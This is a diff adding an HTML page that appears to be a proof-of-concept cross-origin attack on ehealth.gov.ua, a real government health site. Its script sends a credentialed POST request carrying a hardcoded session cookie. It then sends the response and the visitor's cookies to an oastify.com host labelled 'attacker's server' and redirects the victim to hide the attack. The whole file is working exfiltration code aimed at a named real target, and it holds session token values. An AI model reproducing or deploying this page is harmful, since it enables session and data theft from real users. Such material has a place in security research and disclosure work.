@@ -1,1 +1,84 @@
-
+<html>
+<body>
+<h1>Loading...</h1>
+<script>
+// Victim visits this page while logged into target.com
+fetch('https://ehealth.gov.ua/cdn-cgi/rum', {
+  method: 'POST',
+  headers: {
+    'Host': 'ehealth.gov.ua',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Content-Type': 'application/json',
+    'Content-Length': '726',
+    'Origin': 'https://alchemysan.github.io',
+    'Referer': 'https://alchemysan.github.io',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'Te': 'trailers',
+    'Cookie': 'HttpOnly; cpsession=~pre%3aqjGOwl5kdsyJb3HP%2c403320284d4fe6ceda581c6b919c6d0e; timezone=Europe/Helsinki; _ga_EGP8LXBJ6L=GS2.1.s1783425700$o2$g1$t1783428800$j43$l0$h0; _ga=GA1.3.1656593232.1783421313; _ga_M7E5RJVFWJ=GS2.1.s1783425700$o2$g1$t1783428800$j43$l0$h0; _ga_F8HQHF5KEF=GS2.1.s1783425700$o2$g1$t1783428800$j40$l0$h0; _gid=GA1.3.750812769.1783421317; __cf_bm=JRf00rvz.WXoVxDiiyXspsUzs406wGtC8wP4C9JqBR4-1783427926.1410892-1.0.1.1-X8uSfrpVTyblNGZFcMe4DxrKvgXxyFsablzkoW_SxF.2IyUClD_zh2LVrdNKhLwm7alt1SJXlxcWY1IbhogeJ2JL_IVKfzygR33WYAjOPAc5Ainxec_MmPO_g0WxIOF1; _ga_JJQ26BVGTQ=GS2.1.s1783428197$o1$g1$t1783428470$j60$l0$h0; _gat_gtag_UA_202525989_1=1; _gat_gtag_UA_131125632_1=1'
+  },
+  body: JSON.stringify({
+    'memory': {},
+    'resources': [],
+    'referrer': 'https://ehealth.gov.ua/',
+    'eventType': 1,
+    'firstPaint': 0,
+    'firstContentfulPaint': 0,
+    'startTime': 1783428730551,
+    'versions': {
+      'fl': '2024.11.0',
+      'js': '2026.6.0',
+      'timings': 2
+    },
+    'pageloadId': '2e8dce6a-4243-466e-baed-f72866a66248',
+    'location': 'https://ehealth.gov.ua/statusy-testuvannya-ta-pidklyuchennya-dmis-do-ais-tsentral-103/',
+    'nt': 'reload',
+    'timingsV2': {
+      'nextHopProtocol': 'h2',
+      'domainLookupStart': 3,
+      'domainLookupEnd': 3,
+      'connectStart': 3,
+      'connectEnd': 3,
+      'requestStart': 37,
+      'responseStart': 69524,
+      'responseEnd': 69525,
+      'domInteractive': 73126,
+      'domComplete': 73161,
+      'loadEventStart': 73161,
+      'loadEventEnd': 73166,
+      'transferSize': 32841,
+      'decodedBodySize': 32541
+    },
+    'siteToken': '51f6b6d6f76f454cab1fc5c1f66fd188',
+    'st': 2
+  })
+})
+.then(response => response.json())
+.then(data => {
+  // Steal sensitive data
+  console.log('Stolen data:', data);
+  
+  // Send to attacker's server
+  fetch('https://pxqgovjd8sin8f6pqqqgkpphu80zopce.oastify.com', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      victim_data: data,
+      cookies: document.cookie
+    })
+  });
+  
+  // Optional: redirect to hide attack
+  setTimeout(() => {
+    window.location = 'https://target.com';
+  }, 500);
+});
+</script>
+</body>
+</html>
